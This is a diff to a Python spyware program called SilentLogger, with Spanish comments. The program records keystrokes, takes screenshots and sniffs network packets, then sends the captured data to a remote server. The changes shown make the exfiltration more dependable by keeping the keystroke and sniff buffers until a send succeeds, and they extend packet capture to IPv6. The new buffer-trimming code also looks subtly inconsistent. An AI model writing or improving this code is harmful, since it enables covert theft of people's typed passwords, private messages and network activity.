@@ -33,7 +33,7 @@ except ImportError:
     sys.exit(1)
 
 try:
-    from scapy.all import sniff as scapy_sniff, IP, TCP, UDP, Raw
+    from scapy.all import sniff as scapy_sniff, IP, IPv6, TCP, UDP, Raw
     SCAPY_AVAILABLE = True
 except ImportError:
     SCAPY_AVAILABLE = False
@@ -198,18 +198,25 @@ class SilentLogger:
     def flush_loop(self):
         while self.running:
             time.sleep(KEY_BUFFER_FLUSH_INTERVAL)
+            if not self.key_buffer:
+                continue
+
             with self.buffer_lock:
-                if not self.key_buffer:
-                    continue
                 text = "".join(self.key_buffer)
-                self.key_buffer.clear()
+
+            # Log local siempre
             try:
                 with open(LOCAL_LOG_FILE, "a") as f:
                     f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {text}\n")
             except Exception:
                 pass
+
             if self.connected:
-                if not self.send_data("keys", text.encode("utf-8")):
+                if self.send_data("keys", text.encode("utf-8")):
+                    with self.buffer_lock:
+                        # Solo limpiamos lo que acabamos de enviar
+                        self.key_buffer = self.key_buffer[len(text):]
+                else:
                     threading.Thread(target=self.reconnect, daemon=True).start()
 
     def screenshot_loop(self):
@@ -236,10 +243,11 @@ class SilentLogger:
         if not self.running:
             return
         try:
-            if IP in pkt:
+            if IP in pkt or IPv6 in pkt:
+                layer = IP if IP in pkt else IPv6
                 proto = "TCP" if TCP in pkt else ("UDP" if UDP in pkt else "OTHER")
-                src = pkt[IP].src
-                dst = pkt[IP].dst
+                src = pkt[layer].src
+                dst = pkt[layer].dst
                 sport = pkt[TCP].sport if TCP in pkt else (pkt[UDP].sport if UDP in pkt else 0)
                 dport = pkt[TCP].dport if TCP in pkt else (pkt[UDP].dport if UDP in pkt else 0)
                 size = len(pkt)
@@ -273,25 +281,30 @@ class SilentLogger:
             scapy_sniff(prn=self._packet_callback, store=False,
                        count=SNIFF_PACKET_COUNT,
                        stop_filter=lambda x: not self.running)
-        except Exception:
-            pass
+        except Exception as e:
+            # Registrar error si falla el sniffer (posiblemente falta de root o interface)
+            with open(LOCAL_LOG_FILE, "a") as f:
+                f.write(f"[!] Error en sniff_loop: {e}\n")
 
     def sniff_flush_loop(self):
         """Envía el buffer de sniffing periódicamente al servidor."""
         while self.running:
             time.sleep(SNIFF_FLUSH_INTERVAL)
+            if not self.connected or not self.sniff_buffer:
+                continue
+
             with self.sniff_lock:
-                if not self.sniff_buffer:
-                    continue
                 text = "".join(self.sniff_buffer)
-                self.sniff_buffer.clear()
 
             ts = datetime.now().strftime("%Y%m%d_%H%M%S")
             fname = f"sniff_{ts}.txt"
 
-            if self.connected:
-                if not self.send_data("sniff", text.encode("utf-8"), fname):
-                    threading.Thread(target=self.reconnect, daemon=True).start()
+            if self.send_data("sniff", text.encode("utf-8"), fname):
+                with self.sniff_lock:
+                    # Solo limpiamos lo que acabamos de enviar con éxito
+                    self.sniff_buffer = self.sniff_buffer[len(text.splitlines()):]
+            else:
+                threading.Thread(target=self.reconnect, daemon=True).start()
 
     # ── Inicio ────────────────────────────────────────────
 
